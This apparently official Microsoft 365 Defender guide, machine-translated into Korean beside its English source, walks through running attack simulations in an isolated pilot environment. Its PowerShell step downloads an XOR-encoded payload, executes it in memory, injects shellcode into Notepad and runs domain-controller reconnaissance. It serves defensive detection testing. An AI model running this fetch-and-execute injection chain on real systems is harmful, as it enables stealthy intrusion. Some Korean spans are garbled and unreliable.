---
title: 격리된 파일럿 환경에서 공격 시뮬레이션Microsoft 365 Defender 대응, 수정을 위한 공격 시뮬레이션 실행
description: 경고 및 인시던트가 Microsoft 365 Defender 정보를 얻고 위협을 빠르게 수정하는 방법을 파악하기 위해 공격 시뮬레이션을 실행합니다.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
ms.date: 07/09/2021
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: ebea0a8eeed737712c55eb80b9ce3c68e06853c1
ms.sourcegitcommit: 718759c7146062841f7eb4a0a9a8bdddce0139b0
ms.translationtype: MT
ms.contentlocale: ko-KR
ms.lasthandoff: 07/15/2021
ms.locfileid: "53458146"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a><span data-ttu-id="03e09-103">파일럿 환경에서 공격 시뮬레이션 Microsoft 365 Defender 실행</span><span class="sxs-lookup"><span data-stu-id="03e09-103">Run an attack simulation in a Microsoft 365 Defender pilot environment</span></span>


<span data-ttu-id="03e09-104">이 [문서는](eval-defender-investigate-respond.md) 파일럿 환경을 사용하여 파일럿 환경에서 인시던트에 대한 조사 및 대응을 Microsoft 365 Defender 2단계 중 1단계입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-104">This article is [Step 1 of 2](eval-defender-investigate-respond.md) in the process of performing an investigation and response of an incident in Microsoft 365 Defender using a pilot environment.</span></span> <span data-ttu-id="03e09-105">이 프로세스에 대한 자세한 내용은 개요 문서를 [참조하세요.](eval-defender-investigate-respond.md)</span><span class="sxs-lookup"><span data-stu-id="03e09-105">For more information about this process, see the [overview](eval-defender-investigate-respond.md) article.</span></span>

<span data-ttu-id="03e09-106">파일 Microsoft 365 Defender럿 [](eval-defender-investigate-respond.md)환경을 준비한 후 시뮬레이트된 공격으로 인시던트가 생성되고 Microsoft 365 Defender 포털을 사용하여 조사 및 대응하여 인시던트 대응 및 자동화된 조사 및 수정 기능을 테스트해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-106">After preparing your [pilot environment](eval-defender-investigate-respond.md), it's time to test Microsoft 365 Defender's incident response and automated investigation and remediation capabilities by creating an incident with a simulated attack and using the Microsoft 365 Defender portal to investigate and respond.</span></span>

<span data-ttu-id="03e09-107">이 Microsoft 365 Defender 인시던트는 공격의 스토리를 만드는 상호 관련된 경고 및 관련 데이터의 모음입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-107">An incident in Microsoft 365 Defender is a collection of correlated alerts and associated data that make up the story of an attack.</span></span>

<span data-ttu-id="03e09-108">Microsoft 365 및 앱은 의심스러우거나 악의적인 이벤트나 활동을 감지할 때 경고를 생성합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-108">Microsoft 365 services and apps create alerts when they detect a suspicious or malicious event or activity.</span></span> <span data-ttu-id="03e09-109">개별 경고는 완료되거나 지속적인 공격에 대한 중요한 단서를 제공합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-109">Individual alerts provide valuable clues about a completed or ongoing attack.</span></span> <span data-ttu-id="03e09-110">그러나 공격은 일반적으로 장치, 사용자 및 사서함과 같은 다양한 유형의 엔터티에 대해 다양한 기술을 사용합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-110">However, attacks typically employ various techniques against different types of entities, such as devices, users, and mailboxes.</span></span> <span data-ttu-id="03e09-111">그 결과 테넌트의 여러 엔터티에 대한 여러 경고가 생성됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-111">The result is multiple alerts for multiple entities in your tenant.</span></span>

>[!Note]
><span data-ttu-id="03e09-112">보안 분석 및 인시던트 대응이 [](first-incident-overview.md) 처음인 경우 첫 번째 인시던트에 응답 안내를 참조하여 일반적인 분석, 수정 및 인시던트 사후 검토 프로세스를 안내합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-112">If you are brand new to security analysis and incident response, see the [Respond to your first incident walkthrough](first-incident-overview.md) to get a guided tour of a typical process of analysis, remediation, and post-incident review.</span></span>
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a><span data-ttu-id="03e09-113">검색 포털을 Microsoft 365 Defender 시뮬레이션</span><span class="sxs-lookup"><span data-stu-id="03e09-113">Simulate attacks with the Microsoft 365 Defender portal</span></span>

<span data-ttu-id="03e09-114">Microsoft 365 Defender 포털에는 파일럿 환경에 시뮬레이션된 공격을 만들 수 있는 기본 제공 기능이 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-114">The Microsoft 365 Defender portal has built-in capabilities to create simulated attacks on your pilot environment:</span></span>

- <span data-ttu-id="03e09-115">에서 에 대한 Microsoft 365 Defender 시뮬레이션 [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator) Office 365.</span><span class="sxs-lookup"><span data-stu-id="03e09-115">Attack simulation training for Microsoft 365 Defender for Office 365 at [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).</span></span>
  
  <span data-ttu-id="03e09-116">Microsoft 365 Defender 포털에서 전자 메일 & 시뮬레이션 > **선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="03e09-116">In the Microsoft 365 Defender portal, select **Email & collaboration > Attack simulation training**.</span></span>

- <span data-ttu-id="03e09-117">공격 자습서는 & 끝점에 대한 Microsoft 365 Defender 시뮬레이션을 [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations) 제공합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-117">Attack tutorials & simulations for Microsoft 365 Defender for Endpoints at [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).</span></span>

  <span data-ttu-id="03e09-118">Microsoft 365 Defender 포털에서 끝점 > 시뮬레이션 & **선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="03e09-118">In the Microsoft 365 Defender portal, select **Endpoints > Tutorials & simulations**.</span></span>

### <a name="defender-for-office-365-attack-simulation-training"></a><span data-ttu-id="03e09-119">공격 시뮬레이션 Office 365 수비수</span><span class="sxs-lookup"><span data-stu-id="03e09-119">Defender for Office 365 Attack simulation training</span></span>

<span data-ttu-id="03e09-120">Office 365 Microsoft 365 E5 또는 Microsoft Defender for Office 365 계획 2에 대한 공격 시뮬레이션 교육이 포함되어 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-120">Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 includes attack simulation training for phishing attacks.</span></span> <span data-ttu-id="03e09-121">기본 단계는 다음입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-121">The basic steps are:</span></span>

1. <span data-ttu-id="03e09-122">시뮬레이션 만들기</span><span class="sxs-lookup"><span data-stu-id="03e09-122">Create a simulation</span></span>

   <span data-ttu-id="03e09-123">새 시뮬레이션을 만들고 보내는 방법에 대한 단계별 지침은 피싱 공격 [시뮬레이트를 참조하세요.](/microsoft-365/security/office-365-security/attack-simulation-training)</span><span class="sxs-lookup"><span data-stu-id="03e09-123">For step by step instructions on how to create and send a new simulation, see [Simulate a phishing attack](/microsoft-365/security/office-365-security/attack-simulation-training).</span></span>

2. <span data-ttu-id="03e09-124">페이로드 만들기</span><span class="sxs-lookup"><span data-stu-id="03e09-124">Create a payload</span></span>

   <span data-ttu-id="03e09-125">시뮬레이션 내에서 사용할 페이로드를 만드는 방법에 대한 단계별 지침은 공격 시뮬레이션 교육을 위한 사용자 지정 [페이로드 만들기를 참조하세요.](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)</span><span class="sxs-lookup"><span data-stu-id="03e09-125">For step by step instructions on how to create a payload for use within a simulation, see [Create a custom payload for Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).</span></span>

3. <span data-ttu-id="03e09-126">인사이트 얻기</span><span class="sxs-lookup"><span data-stu-id="03e09-126">Gaining insights</span></span>

   <span data-ttu-id="03e09-127">보고를 통해 인사이트를 얻는 방법에 대한 단계별 지침은 공격 시뮬레이션 교육을 통해 인사이트 [얻기를 참조하세요.](/microsoft-365/security/office-365-security/attack-simulation-training-insights)</span><span class="sxs-lookup"><span data-stu-id="03e09-127">For step by step instructions on how to gain insights with reporting, see [Gain insights through Attack simulation training](/microsoft-365/security/office-365-security/attack-simulation-training-insights).</span></span>

<span data-ttu-id="03e09-128">자세한 내용은 [시뮬레이션을 참조하세요.](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)</span><span class="sxs-lookup"><span data-stu-id="03e09-128">For more information, see [Simulations](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).</span></span>

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a><span data-ttu-id="03e09-129">Endpoint 공격용 Defender & 시뮬레이션</span><span class="sxs-lookup"><span data-stu-id="03e09-129">Defender for Endpoint attack tutorials & simulations</span></span>

<span data-ttu-id="03e09-130">다음은 Microsoft의 Endpoint 시뮬레이션용 Defender입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-130">Here are the Defender for Endpoint simulations from Microsoft:</span></span>

- <span data-ttu-id="03e09-131">문서 드롭 백도어</span><span class="sxs-lookup"><span data-stu-id="03e09-131">Document drops backdoor</span></span>
- <span data-ttu-id="03e09-132">자동화된 조사(백도어)</span><span class="sxs-lookup"><span data-stu-id="03e09-132">Automated investigation (backdoor)</span></span>

<span data-ttu-id="03e09-133">공격 IQ 및 SafeBreach에서 추가 시뮬레이션이 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-133">There are additional simulations from Attack IQ and SafeBreach.</span></span> <span data-ttu-id="03e09-134">자습서 집합도 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-134">There are also a set of tutorials.</span></span>

<span data-ttu-id="03e09-135">각 시뮬레이션 또는 자습서에 대해 다음을 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-135">For each simulation or tutorial:</span></span>

1. <span data-ttu-id="03e09-136">선택한 시뮬레이션 또는 시나리오와 함께 제공되는 해당 문서를 다운로드하고 읽어 읽습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-136">Download and read the corresponding walk through document provided with your selected simulation or scenario.</span></span>

2. <span data-ttu-id="03e09-137">시뮬레이션 파일을 다운로드합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-137">Download the simulation file.</span></span> <span data-ttu-id="03e09-138">테스트 장치에서 파일 또는 스크립트를 다운로드할 수 있지만 필수는 아닙니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-138">You can choose to download the file or script on the test device but it's not mandatory.</span></span>

3. <span data-ttu-id="03e09-139">문서의 단계에 따라 테스트 장치에서 시뮬레이션 파일 또는 스크립트를 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-139">Run the simulation file or script on the test device as instructed in the walk through document.</span></span>

 <span data-ttu-id="03e09-140">자세한 내용은 시뮬레이트된 [공격을 통해 끝점에 대한 Microsoft Defender 환경을 참조하세요.](/microsoft-365/security/defender-endpoint/attack-simulations)</span><span class="sxs-lookup"><span data-stu-id="03e09-140">For more information, see [Experience Microsoft Defender for Endpoint through simulated attack](/microsoft-365/security/defender-endpoint/attack-simulations).</span></span>

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a><span data-ttu-id="03e09-141">격리된 도메인 컨트롤러 및 클라이언트 장치를 사용하여 공격 시뮬레이션(선택 사항)</span><span class="sxs-lookup"><span data-stu-id="03e09-141">Simulate an attack with an isolated domain controller and client device (optional)</span></span>

<span data-ttu-id="03e09-142">이 선택적 인시던트 대응 연습에서는 PowerShell 스크립트를 사용하여 격리된 AD DS(Active Directory 도메인 서비스) 도메인 컨트롤러 및 Windows 10 디바이스에 대한 공격을 시뮬레이션한 다음 인시던트 조사, 수정 및 해결합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-142">In this optional incident response exercise, you'll simulate an attack on an isolated Active Directory Domain Services (AD DS) domain controller and Windows 10 device using a PowerShell script and then investigate, remediate, and resolve the incident.</span></span>

<span data-ttu-id="03e09-143">먼저 파일럿 환경에 끝점을 추가해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-143">First, you need to add endpoints to your pilot environment.</span></span>

### <a name="add-pilot-environment-endpoints"></a><span data-ttu-id="03e09-144">파일럿 환경 끝점 추가</span><span class="sxs-lookup"><span data-stu-id="03e09-144">Add pilot environment endpoints</span></span>

<span data-ttu-id="03e09-145">먼저 격리된 AD DS 도메인 컨트롤러 및 Windows 10 장치를 파일럿 환경에 추가해야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-145">First, you need to add an isolated AD DS domain controller and a Windows 10 device to your pilot environment.</span></span>

1. <span data-ttu-id="03e09-146">파일럿 환경 테넌트에서 [를 사용하도록 설정되어 있는지 Microsoft 365 Defender.](m365d-enable.md#confirm-that-the-service-is-on)</span><span class="sxs-lookup"><span data-stu-id="03e09-146">Verify your pilot environment tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>

2. <span data-ttu-id="03e09-147">도메인 컨트롤러가 다음을 하는지 확인:</span><span class="sxs-lookup"><span data-stu-id="03e09-147">Verify that your domain controller:</span></span>

   - <span data-ttu-id="03e09-148">Server Windows 2008 R2 이상 버전을 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-148">Runs Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="03e09-149">ID에 [대한 Microsoft Defender에 보고하고](/azure/security-center/security-center-wdatp) 원격 관리를 [사용하도록 설정했습니다.](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)</span><span class="sxs-lookup"><span data-stu-id="03e09-149">Reports to [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) and has enabled [remote management](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="03e09-150">Microsoft Defender for Identity 및 Microsoft Cloud App Security [통합이 사용하도록 설정되어](/cloud-app-security/mdi-integration) 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-150">Has [Microsoft Defender for Identity and Microsoft Cloud App Security integration](/cloud-app-security/mdi-integration) enabled.</span></span>
   - <span data-ttu-id="03e09-151">테스트 도메인에 테스트 사용자가 만들어졌습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-151">Has a test user is created in the test domain.</span></span> <span data-ttu-id="03e09-152">관리자 수준 사용 권한은 필요하지 않습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-152">Administrator-level permissions are not needed.</span></span>

3. <span data-ttu-id="03e09-153">테스트 장치가 다음을 하는지 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-153">Verify that your test device:</span></span>

   - <span data-ttu-id="03e09-154">1903 Windows 10 이상 버전을 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-154">Runs Windows 10 version 1903 or a later version.</span></span>
   - <span data-ttu-id="03e09-155">AD DS 도메인 컨트롤러 도메인에 가입됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-155">Is joined to the AD DS domain controller domain.</span></span>
   - <span data-ttu-id="03e09-156">사용 [Windows Defender 바이러스 백신](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-156">Has [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) enabled.</span></span> <span data-ttu-id="03e09-157">사용자 설정에 문제가 Windows Defender 바이러스 백신 문제 해결 항목을 [참조하세요.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="03e09-157">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
   - <span data-ttu-id="03e09-158">[끝점용 Microsoft Defender에 온보딩됩니다.](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)</span><span class="sxs-lookup"><span data-stu-id="03e09-158">Is [onboarded to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="03e09-159">테넌트 및 장치 그룹을 사용하는 경우 테스트 장치에 대한 전용 장치 그룹을 만들고 최상위 수준으로 푸시합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-159">If you use tenant and device groups, create a dedicated device group for the test device and push it to top level.</span></span>

<span data-ttu-id="03e09-160">한 가지 대안은 AD DS 도메인 컨트롤러를 호스트하고 디바이스를 인프라 서비스에서 가상 컴퓨터로 Microsoft Azure 것입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-160">One alternative is to host your AD DS domain controller and test device as virtual machines in Microsoft Azure infrastructure services.</span></span> <span data-ttu-id="03e09-161">시뮬레이트된 엔터프라이즈 테스트 [랩 가이드의 1단계에](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)있는 지침을 사용할 수 있지만 APP1 가상 컴퓨터 만들기는 건너뛰어도 됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-161">You can use the instructions in [Phase 1 of the simulated enterprise Test Lab Guide](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), but skip the creation of the APP1 virtual machine.</span></span>

<span data-ttu-id="03e09-162">결과는 다음과 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-162">Here is the result.</span></span>

![시뮬레이트된 엔터프라이즈 테스트 랩 가이드를 사용하는 Defender 평가 환경의 끝점](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

<span data-ttu-id="03e09-164">고급 기술을 활용하여 감지에서 숨기는 정교한 공격을 시뮬레이트합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-164">You'll simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="03e09-165">이 공격은 도메인 컨트롤러에서 연 SMB(서버 메시지 블록) 세션을 열고 사용자의 장치의 최근 IP 주소를 검색합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-165">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="03e09-166">일반적으로 이 공격 범주에는 피해자의 장치에 삭제된 파일이 포함되지는 않습니다. 이러한 파일은 메모리에서만 발생합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-166">This category of attacks usually doesn't include files dropped on the victim's device and they occur solely in memory.</span></span> <span data-ttu-id="03e09-167">기존 시스템 및 관리 도구를 사용하여 "이 육지에서 라이브"를 실행하고 실행을 숨기기 위해 시스템 프로세스에 코드를 삽입합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-167">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution.</span></span> <span data-ttu-id="03e09-168">이러한 동작을 사용하면 검색을 방지하고 디바이스에서 유지될 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-168">Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="03e09-169">이 시뮬레이션에서는 샘플 시나리오가 PowerShell 스크립트로 시작됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-169">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="03e09-170">실제로 사용자는 스크립트를 실행하도록 속일 수 있습니다. 또는 이전에 감염된 장치에서 다른 컴퓨터로의 원격 연결에서 스크립트가 실행될 수 있습니다. 이는 공격자가 네트워크에서 을(를) 끊어 이동하려고 시도하고 있는 것일 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-170">In the real world, a user might be tricked into running a script or the script might run from a remote connection to another computer from a previously infected device, which indicates that the attacker is attempting to move laterally in the network.</span></span> <span data-ttu-id="03e09-171">관리자가 스크립트를 원격으로 실행하여 다양한 관리 작업을 수행하기도 하여 이러한 스크립트를 검색하기 어려울 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-171">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![프로세스 주입 및 SMB 정비 공격 다이어그램을 사용하여 파일 없는 PowerShell 공격](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="03e09-173">시뮬레이션하는 동안 공격은 셸코드를 무고한 프로세스에 주입합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-173">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="03e09-174">이 시나리오에서는 이 시나리오를 사용하려면 notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="03e09-174">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="03e09-175">시뮬레이션을 위해 이 프로세스를 선택했지만 공격자는 추가와 같은 장기 실행 시스템 프로세스를 대상으로 할 svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="03e09-175">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="03e09-176">그런 다음 셸 코드는 공격자 명령 및 제어(C2) 서버에 연결하여 진행 방법에 대한 지침을 수신합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-176">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="03e09-177">스크립트는 DC(도메인 컨트롤러)에 대해 정비 쿼리 실행을 시도합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-177">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="03e09-178">정비를 통해 공격자는 최근 사용자 로그인 정보에 대한 정보를 얻을 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-178">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="03e09-179">공격자가 이 정보를 가지면 네트워크에서 을(를) 이동하여 특정 중요한 계정으로 이동할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-179">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="03e09-180">최적의 결과를 얻기 위해 가능한 한 공격 시뮬레이션 지침을 따르세요.</span><span class="sxs-lookup"><span data-stu-id="03e09-180">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a><span data-ttu-id="03e09-181">격리된 AD DS 도메인 컨트롤러 공격 시뮬레이션 실행</span><span class="sxs-lookup"><span data-stu-id="03e09-181">Run the isolated AD DS domain controller attack simulation</span></span>

<span data-ttu-id="03e09-182">공격 시나리오 시뮬레이션을 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-182">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="03e09-183">파일럿 환경에 격리된 AD DS 도메인 컨트롤러와 장치 Windows 10 확인합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-183">Ensure that your pilot environment includes the isolated AD DS domain controller and Windows 10 device.</span></span>

2. <span data-ttu-id="03e09-184">테스트 사용자 계정을 사용하여 테스트 장치에 로그인합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-184">Sign in to the test device with the test user account.</span></span>

3. <span data-ttu-id="03e09-185">테스트 Windows PowerShell 창을 여십시오.</span><span class="sxs-lookup"><span data-stu-id="03e09-185">Open a Windows PowerShell window on the test device.</span></span>

4. <span data-ttu-id="03e09-186">다음 시뮬레이션 스크립트를 복사합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-186">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="03e09-187">웹 브라우저에서 이 문서를 열면 특정 문자를 잃거나 추가 줄을 끊지 않고 전체 텍스트를 복사하는 데 문제가 발생할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-187">If you open this article on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="03e09-188">이 경우 이 문서를 다운로드하여 Adobe Reader에서 여는 것입니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-188">If this is the case, download this document and open it on Adobe Reader.</span></span>

5. <span data-ttu-id="03e09-189">PowerShell 창에서 복사한 스크립트를 붙여넣고 실행합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-189">Paste and run the copied script in the PowerShell window.</span></span>

> [!NOTE]
> <span data-ttu-id="03e09-190">RDP(원격 데스크톱 프로토콜)를 사용하여 PowerShell을 실행하는 경우 **CTRL-V** 바로 가기 키 또는 마우스 오른쪽 단추 클릭 붙여넣기 메서드가 작동하지 않을 수 있기 때문에 RDP 클라이언트에서 클립보드 텍스트 형식 명령을 사용합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-190">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="03e09-191">최신 버전의 PowerShell도 이 메서드를 허용하지 않는 경우, 메모리에서 메모장 먼저 복사하여 가상 머신에 복사한 다음 PowerShell에 붙여넣아야 할 수 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-191">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="03e09-192">몇 초 후에 메모장 앱이 열립니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-192">A few seconds later, the Notepad app will open.</span></span> <span data-ttu-id="03e09-193">시뮬레이트된 공격 코드는 해당 코드에 메모장.</span><span class="sxs-lookup"><span data-stu-id="03e09-193">A simulated attack code will be injected into Notepad.</span></span> <span data-ttu-id="03e09-194">전체 시나리오를 메모장 자동으로 생성된 메모장 인스턴스를 열어 두면 됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-194">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="03e09-195">시뮬레이트된 공격 코드는 외부 IP 주소(C2 서버 시뮬레이트)와 통신한 다음 SMB를 통해 도메인 컨트롤러에 대한 정경을 시도합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-195">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="03e09-196">이 스크립트가 완료되면 PowerShell 콘솔에 이 메시지가 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-196">You'll see this message displayed on the PowerShell console when this script completes:</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="03e09-197">자동화된 인시던트 및 대응 기능이 실제로 실행되고 notepad.exe 열어 봐야 합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-197">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="03e09-198">자동화된 인시던트 및 대응 프로세스가 메모장 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-198">You'll see Automated Incident and Response stop the Notepad process.</span></span>

### <a name="investigate-the-incident-for-the-simulated-attack"></a><span data-ttu-id="03e09-199">시뮬레이트된 공격에 대한 인시던트 조사</span><span class="sxs-lookup"><span data-stu-id="03e09-199">Investigate the incident for the simulated attack</span></span>

> [!NOTE]
> <span data-ttu-id="03e09-200">이 시뮬레이션을 진행하기 전에 다음 비디오를 시청하여 인시던트 관리가 관련 경고를 조사 프로세스의 일부로 모을 수 있는 방법, 포털에서 찾을 수 있는 위치 및 보안 작업에 도움이 되는 방법을 참조합니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-200">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="03e09-201">SOC 분석가의 시선으로 전환하면 이제 포털에서 공격 조사를 시작할 Microsoft 365 Defender 있습니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-201">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Defender portal.</span></span>

1. <span data-ttu-id="03e09-202">웹 Microsoft 365 Defender [를 열 수 있습니다.](https://security.microsoft.com/)</span><span class="sxs-lookup"><span data-stu-id="03e09-202">Open the [Microsoft 365 Defender portal](https://security.microsoft.com/).</span></span>

2. <span data-ttu-id="03e09-203">탐색 창에서 인시던트 및 & 알림 > **선택합니다.**</span><span class="sxs-lookup"><span data-stu-id="03e09-203">From the navigation pane, select **Incidents & Alerts > Incidents**.</span></span>

3. <span data-ttu-id="03e09-204">시뮬레이트된 공격에 대한 새 인시던트가 인시던트 큐에 표시됩니다.</span><span class="sxs-lookup"><span data-stu-id="03e09-204">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![인시던트 큐의 예](../../media/mtp/fig2.png)

